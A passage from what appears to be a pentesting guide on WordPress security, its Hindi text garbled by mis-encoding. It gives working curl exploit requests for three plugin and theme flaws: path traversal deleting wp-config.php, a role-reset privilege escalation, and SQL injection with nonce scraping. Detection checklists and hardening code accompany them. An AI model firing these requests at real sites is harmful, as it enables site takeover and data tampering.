Litho рдмрд╣реБрдЙрджреНрджреЗрд╢реАрдп рдереАрдо (< 3.1) рдиреЗ *Remove Font Family* рдлреАрдЪрд░ рдореЗрдВ рдЙрди 3 рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ рднреВрд▓ рдЧрдпрд╛ рдФрд░ рдЕрдВрддрддрдГ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб (рд╕рд░рд▓) рднреЗрдЬрд╛:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
рдЗрд╕ рд╕реНрдирд┐рдкреЗрдЯ рджреНрд╡рд╛рд░рд╛ рдкреЗрд╢ рдХреА рдЧрдИ рд╕рдорд╕реНрдпрд╛рдПрдБ:

* **рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдкрд╣реБрдБрдЪ** тАУ `wp_ajax_nopriv_` рд╣реБрдХ рдкрдВрдЬреАрдХреГрдд рд╣реИред
* **рдХреЛрдИ рдиреЙрдирд╕ / рдХреНрд╖рдорддрд╛ рдЬрд╛рдВрдЪ рдирд╣реАрдВ** тАУ рдХреЛрдИ рднреА рдЖрдЧрдВрддреБрдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдИ рдкрде рд╕рдлрд╛рдИ рдирд╣реАрдВ** тАУ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдирд┐рдпрдВрддреНрд░рд┐рдд `fontfamily` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдмрд┐рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрде рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ `../../` рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

#### рд╢реЛрд╖рдг

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ **рдЕрдкрд▓реЛрдбреНрд╕ рдмреЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдиреАрдЪреЗ** (рд╕рд╛рдорд╛рдиреНрдпрддрдГ `<wp-root>/wp-content/uploads/` ) рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХрд▓ HTTP POST рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
рдХреНрдпреЛрдВрдХрд┐ `wp-config.php` *uploads* рдХреЗ рдмрд╛рд╣рд░ рд░рд╣рддрд╛ рд╣реИ, рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдкрд░ рдЪрд╛рд░ `../` рдЕрдиреБрдХреНрд░рдо рдкрд░реНрдпрд╛рдкреНрдд рд╣реИрдВред `wp-config.php` рдХреЛ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдЕрдЧрд▓реЗ рджреМрд░реЗ рдкрд░ WordPress рдХреЛ *installation wizard* рдореЗрдВ рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреВрд░реА рд╕рд╛рдЗрдЯ рдкрд░ рдХрдмреНрдЬрд╛ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ (рд╣рдорд▓рд╛рд╡рд░ рдХреЗрд╡рд▓ рдПрдХ рдирдпрд╛ DB рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддрд╛ рд╣реИ)ред

рдЕрдиреНрдп рдкреНрд░рднрд╛рд╡рд╢рд╛рд▓реА рд▓рдХреНрд╖реНрдп рдореЗрдВ рдкреНрд▓рдЧрдЗрди/рдереАрдо рдХреЗ `.php` рдлрд╝рд╛рдЗрд▓реЗрдВ (рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд▓рдЧрдЗрдиреЛрдВ рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП) рдпрд╛ `.htaccess` рдирд┐рдпрдо рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

#### Detection checklist

* рдХреЛрдИ рднреА `add_action( 'wp_ajax_nopriv_...')` рдХреЙрд▓рдмреИрдХ рдЬреЛ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╣реЗрд▓реНрдкрд░реНрд╕ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, рдЖрджрд┐) рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред
* рдкрдереЛрдВ рдореЗрдВ рдЕрд╕рдВрдХреНрд░рдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХрд╛ рд╕рдВрдпреЛрдЬрди (рджреЗрдЦреЗрдВ `$_POST`, `$_GET`, `$_REQUEST`)ред
* `check_ajax_referer()` рдФрд░ `current_user_can()`/`is_user_logged_in()` рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ред

#### Hardening
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// тАж proceed тАж
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ЁЯФТ  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **рд╣рдореЗрд╢рд╛** рдбрд┐рд╕реНрдХ рдкрд░ рдХрд┐рд╕реА рднреА рд▓рд┐рдЦрдиреЗ/рд╣рдЯрд╛рдиреЗ рдХреЗ рдСрдкрд░реЗрд╢рди рдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдиреЗрдВ рдФрд░ рджреЛрдмрд╛рд░рд╛ рдЬрд╛рдВрдЪреЗрдВ:
> тАв рдкреНрд░рдорд╛рдгреАрдХрд░рдг  тАв рдЕрдзрд┐рдХреГрдд рдХрд░рдирд╛  тАв рдиреЙрдирд╕  тАв рдЗрдирдкреБрдЯ рд╕рдлрд╛рдИ  тАв рдкрде рд╕реАрдорд╛рдВрдХрди (рдЬреИрд╕реЗ `realpath()` рдФрд░ `str_starts_with()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)ред

---

### рдкреБрд░рд╛рдиреА рднреВрдорд┐рдХрд╛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рдФрд░ рдЕрдиреБрдкрд╕реНрдерд┐рдд рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ (ASE "View Admin as Role")

рдХрдИ рдкреНрд▓рдЧрдЗрдиреНрд╕ "рднреВрдорд┐рдХрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦреЗрдВ" рдпрд╛ рдЕрд╕реНрдерд╛рдпреА рднреВрдорд┐рдХрд╛-рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рдлреАрдЪрд░ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдЯрд╛ рдореЗрдВ рдореВрд▓ рднреВрдорд┐рдХрд╛(рдУрдВ) рдХреЛ рд╕рд╣реЗрдЬрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдж рдореЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрджрд┐ рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рдкрде рдХреЗрд╡рд▓ рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░ (рдЬреИрд╕реЗ, `$_REQUEST['reset-for']`) рдФрд░ рдПрдХ рдкреНрд▓рдЧрдЗрди-рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕реВрдЪреА рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХреНрд╖рдорддрд╛рдУрдВ рдФрд░ рдПрдХ рдорд╛рдиреНрдп рдиреЙрдирд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд┐рдП, рддреЛ рдпрд╣ рдПрдХ рдКрд░реНрдзреНрд╡рд╛рдзрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдмрди рдЬрд╛рддреА рд╣реИред

рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг Admin рдФрд░ Site Enhancements (ASE) рдкреНрд▓рдЧрдЗрди (тЙд 7.6.2.1) рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ред рд░реАрд╕реЗрдЯ рд╢рд╛рдЦрд╛ рдиреЗ `reset-for=<username>` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдПрдХ рдЖрдВрддрд░рд┐рдХ рд╕рд░рдгреА `$options['viewing_admin_as_role_are']` рдореЗрдВ рджрд┐рдЦрд╛рдИ рджрд┐рдпрд╛, рд▓реЗрдХрд┐рди рд╡рд░реНрддрдорд╛рди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдЯрд╛ `_asenha_view_admin_as_original_roles` рд╕реЗ рд╕рд╣реЗрдЬреА рдЧрдИ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рди рддреЛ `current_user_can()` рдЬрд╛рдВрдЪ рдХреА рдЧрдИ рдФрд░ рди рд╣реА рдиреЙрдирд╕ рд╕рддреНрдпрд╛рдкрди рдХрд┐рдпрд╛ рдЧрдпрд╛:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
рдХреНрдпреЛрдВ рдпрд╣ рд╢реЛрд╖рдгреАрдп рд╣реИ

- рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдмрд┐рдирд╛ `$_REQUEST['reset-for']` рдФрд░ рдПрдХ рдкреНрд▓рдЧрдЗрди рд╡рд┐рдХрд▓реНрдк рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИред
- рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ `_asenha_view_admin_as_original_roles` рдореЗрдВ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдереЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд┐рдпрд╛ рдЧрдпрд╛, рддреЛ рд╡реЗ рд░реАрд╕реЗрдЯ рдкрде рдкрд░ рдЬрд╛рдХрд░ рдЙрдиреНрд╣реЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдХреБрдЫ рддреИрдирд╛рддрд┐рдпреЛрдВ рдореЗрдВ, рдХреЛрдИ рднреА рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `viewing_admin_as_role_are` рдореЗрдВ рдЕрднреА рднреА рдореМрдЬреВрдж рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд▓рд┐рдП рд░реАрд╕реЗрдЯ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЯреВрдЯреА рд╣реБрдИ рдкреНрд░рд╛рдзрд┐рдХрд░рдг)ред

рд╣рдорд▓реЗ рдХреА рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдБ

- рдХрдордЬреЛрд░ рдкреНрд▓рдЧрдЗрди рд╕рдВрд╕реНрдХрд░рдг рдЬрд┐рд╕рдореЗрдВ рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рд╕рдХреНрд╖рдо рд╣реИред
- рд▓рдХреНрд╖рд┐рдд рдЦрд╛рддреЗ рдореЗрдВ рдкрд╣рд▓реЗ рдХреЗ рдЙрдкрдпреЛрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдЯрд╛ рдореЗрдВ рдПрдХ рдкреБрд░рд╛рдиреА рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднреВрдорд┐рдХрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред
- рдХреЛрдИ рднреА рдкреНрд░рдорд╛рдгрд┐рдд рд╕рддреНрд░; рд░реАрд╕реЗрдЯ рдкреНрд░рд╡рд╛рд╣ рдкрд░ рдиреЙрдирд╕/рдХреНрд╖рдорддрд╛ рдЧрд╛рдпрдм рд╣реИред

рд╢реЛрд╖рдг (рдЙрджрд╛рд╣рд░рдг)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
рдХрдордЬреЛрд░ рдмрд┐рд▓реНрдб рдкрд░, рдпрд╣ рд╡рд░реНрддрдорд╛рди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рд╣реЗрдЬреА рдЧрдИ рдореВрд▓ рднреВрдорд┐рдХрд╛рдУрдВ (рдЬреИрд╕реЗ, `administrator`) рдХреЛ рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рддрд╛ рд╣реИред

рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЪреЗрдХрд▓рд┐рд╕реНрдЯ

- рдЙрди рднреВрдорд┐рдХрд╛-рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдЯрд╛ рдореЗрдВ тАЬрдореВрд▓ рднреВрдорд┐рдХрд╛рдУрдВтАЭ рдХреЛ рдмрдирд╛рдП рд░рдЦрддреА рд╣реИрдВ (рдЬреИрд╕реЗ, `_asenha_view_admin_as_original_roles`)ред
- рд░реАрд╕реЗрдЯ/рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рдкрдереЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ:
- `$_REQUEST` / `$_GET` / `$_POST` рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкрдврд╝рддреЗ рд╣реИрдВред
- `add_role()` / `remove_role()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдмрд┐рдирд╛ `current_user_can()` рдФрд░ `wp_verify_nonce()` / `check_admin_referer()` рдХреЗред
- рдПрдХ рдкреНрд▓рдЧрдЗрди рд╡рд┐рдХрд▓реНрдк рд╕рд░рдгреА (рдЬреИрд╕реЗ, `viewing_admin_as_role_are`) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдзрд┐рдХреГрдд рдХрд░рддреЗ рд╣реИрдВ, рди рдХрд┐ рдЕрднрд┐рдиреЗрддрд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред

рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдирд╛

- рд╣рд░ рд╕реНрдерд┐рддрд┐-рдкрд░рд┐рд╡рд░реНрддрди рд╢рд╛рдЦрд╛ рдкрд░ рдХреНрд╖рдорддрд╛ рдЬрд╛рдВрдЪ рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗрдВ (рдЬреИрд╕реЗ, `current_user_can('manage_options')` рдпрд╛ рдЕрдзрд┐рдХ рд╕рдЦреНрдд)ред
- рд╕рднреА рднреВрдорд┐рдХрд╛/рдЕрдиреБрдорддрд┐ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдиреЙрдирд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ: `check_admin_referer()` / `wp_verify_nonce()`ред
- рдХрднреА рднреА рдЕрдиреБрд░реЛрдз-рдкреНрд░рджрддреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВ; рдкреНрд░рдорд╛рдгрд┐рдд рдЕрднрд┐рдиреЗрддрд╛ рдФрд░ рд╕реНрдкрд╖реНрдЯ рдиреАрддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рд╣рд▓ рдХрд░реЗрдВред
- рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓/рднреВрдорд┐рдХрд╛ рдЕрдкрдбреЗрдЯ рдкрд░ тАЬрдореВрд▓ рднреВрдорд┐рдХрд╛рдУрдВтАЭ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдЕрдорд╛рдиреНрдп рдХрд░реЗрдВ рддрд╛рдХрд┐ рдкреБрд░рд╛рдиреА рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрд╣рд╛рд▓реА рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- рдиреНрдпреВрдирддрдо рд╕реНрдерд┐рддрд┐ рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ рдФрд░ рдЕрд╕реНрдерд╛рдпреА рднреВрдорд┐рдХрд╛ рд╕реНрд╡рд┐рдЪ рдХреЗ рд▓рд┐рдП рд╕рдордп-рд╕реАрдорд┐рдд, рдХреНрд╖рдорддрд╛-рд░рдХреНрд╖рд┐рдд рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

---

## WordPress рд╕реБрд░рдХреНрд╖рд╛

### рдирд┐рдпрдорд┐рдд рдЕрдкрдбреЗрдЯ

рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ WordPress, рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдо рдЕрдкрдбреЗрдЯ рд╣реИрдВред рдпрд╣ рднреА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдХрд┐ wp-config.php рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЕрдкрдбреЗрдЯ рд╕рдХреНрд╖рдо рд╣реИ:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **рдХреЗрд╡рд▓ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп WordPress рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдореНрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ**ред

### рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд▓рдЧрдЗрдиреНрд╕

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **рдЕрдиреНрдп рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ**

- рдбрд┐рдлрд╝реЙрд▓реНрдЯ **admin** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рдЯрд╛рдПрдВ
- **рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ **2FA** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
- рд╕рдордп-рд╕рдордп рдкрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреА **рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреА **рд╕рдореАрдХреНрд╖рд╛** рдХрд░реЗрдВ
- Brute Force рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП **рд▓реЙрдЧрд┐рди рдкреНрд░рдпрд╛рд╕реЛрдВ** рдХреА рд╕рдВрдЦреНрдпрд╛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ
- **`wp-admin.php`** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ рдФрд░ рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдХреБрдЫ IP рдкрддреЗ рд╕реЗ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред

### рдЕрдкрд░реНрдпрд╛рдкреНрдд рд╕рддреНрдпрд╛рдкрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдирдзрд┐рдХреГрдд SQL рдЗрдВрдЬреЗрдХреНрд╢рди (WP Job Portal <= 2.3.2)

WP Job Portal рднрд░реНрддреА рдкреНрд▓рдЧрдЗрди рдиреЗ рдПрдХ **savecategory** рдХрд╛рд░реНрдп рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдпрд╛ рдЬреЛ рдЕрдВрддрддрдГ `modules/category/model.php::validateFormData()` рдХреЗ рдЕрдВрджрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдордЬреЛрд░ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat тЬЧ
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
рдЗрд╕ рд╕реНрдирд┐рдкреЗрдЯ рджреНрд╡рд╛рд░рд╛ рдкреЗрд╢ рдХреА рдЧрдИ рд╕рдорд╕реНрдпрд╛рдПрдБ:

1. **рдЕрд╕рдВрд╕рд╛рдзрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** тАУ `parentid` рд╕реАрдзреЗ HTTP рдЕрдиреБрд░реЛрдз рд╕реЗ рдЖрддрд╛ рд╣реИред
2. **WHERE рдХреНрд▓реЙрдЬ рдХреЗ рдЕрдВрджрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рдВрдпреЛрдЬрди** тАУ рдХреЛрдИ `is_numeric()` / `esc_sql()` / рддреИрдпрд╛рд░ рдмрдпрд╛рди рдирд╣реАрдВ рд╣реИред
3. **рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдкрд╣реБрдВрдЪ** тАУ рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреНрд░рд┐рдпрд╛ `admin-post.php` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдПрдХ рдЬрд╛рдВрдЪ рдореМрдЬреВрдж рд╣реИ, рдЬреЛ рдПрдХ **CSRF рдиреЙрдиреНрд╕** (`wp_verify_nonce()`) рд╣реИ, рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА рдЖрдЧрдВрддреБрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреГрд╖реНрда рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╢реЙрд░реНрдЯрдХреЛрдб `[wpjobportal_my_resumes]` рд╢рд╛рдорд┐рд▓ рд╣реИред

#### рд╢реЛрд╖рдг

1. рдПрдХ рддрд╛рдЬрд╛ рдиреЙрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдирд╛ SQL рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
